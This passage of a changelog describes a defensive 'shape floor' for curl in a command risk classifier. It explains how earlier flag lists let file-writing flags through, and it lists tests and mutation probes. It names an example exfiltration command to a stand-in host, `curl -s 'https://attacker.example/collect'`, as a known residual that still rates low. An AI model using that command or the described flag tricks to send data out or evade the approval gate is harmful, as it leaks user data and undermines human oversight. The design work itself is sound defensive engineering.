...
- **A curl read-only SHAPE floor for the Risk Classifier** (task `fdaad781`, decision D-026), reintroducing a `low`-severity `curl` recognition after decision D-013 (task `2929c5b7`) removed one entirely, following a per-flag DENYLIST and then a per-flag ALLOWLIST that each leaked (round 2 missed `-o`; round 3 admitted `-w`/`--write-out`, whose format string writes a local file via curl 8.3.0's `%output{FILE}` directive). Both leaks shared one root cause: a per-flag list is only as correct as the last reasoner's enumeration of every flag's write capability across every curl version. This floor inverts the burden instead: it recognizes ONE narrow invocation SHAPE (a bare, unwrapped `curl`, a single single-quoted `https://` URL, and a closed set of flags proven incapable of naming a file or a method) and forfeits (stays unclassified) on every other spelling, so a flag nobody has reasoned about here can only widen the unclassified, approval-gated set; it can never slip into `low` by omission.
  ...
  - Allowed shape: head exactly `curl` (no path prefix, no `env`/`command`/`sudo` wrapper); exactly one operand, a single-quoted `https://` URL with no globbing characters, whitespace, backslash, backtick, `$`, `http://`, or userinfo; flags only from `-s`/`-S`/`-L`/`-f`/`-I`/`-k` (any cluster combination), `--silent`/`--show-error`/`--location`/`--fail`/`--head`/`--insecure`, and `-H`/`--header` or `-m`/`--max-time`/`--connect-timeout` in separate-token form only (quoted header value, no `@` prefix, no `$`/backtick/newline; bare-integer timeout), never glued, never `=`-joined, never repeated. Any chaining, redirection, substitution, unknown flag, or second operand forfeits the whole command.
  ...
  - Unchanged residual: this floor still authorizes URL-only exfiltration (`curl -s 'https://attacker.example/collect'` floors `low`); no flag analysis decides whether a URL is trustworthy.
  - **Tests** (`tests/runtime/read-only-floors.test.ts`): positive fixtures for every allowed spelling in the shape; negative fixtures split by exact outcome (genuinely unclassified vs. raised to `high` by the destructive floor instead of floored `low`), each isolating exactly one forbidden spelling against an otherwise-valid base; the unchanged residual; the pre-existing generic `--help`/`--version` shape; and pins that `isReadOnlyBashCommand` still never accepts curl. Mutation probes (each applied, run, and reverted): admitting `-o` as a value-taking flag turns the `-o f` negative red; dropping the closed-list check on short-flag clusters turns the `-v` (and six other) negatives red; accepting an unquoted URL turns the unquoted-URL negative red; allowing `http://` turns that negative red.
  - Docs: `docs/risk-gate.md`'s curl section rewritten for the new posture (the shape, the forfeit rule, composition below the destructive floor, the unchanged URL-exfiltration residual and operator escape hatch), a new `low` row in the destructive-floor's recognized-shapes table, and the "Unclassified actions" section's curl paragraph split out from the `ssh`/`node -e` group it no longer fully belongs to.
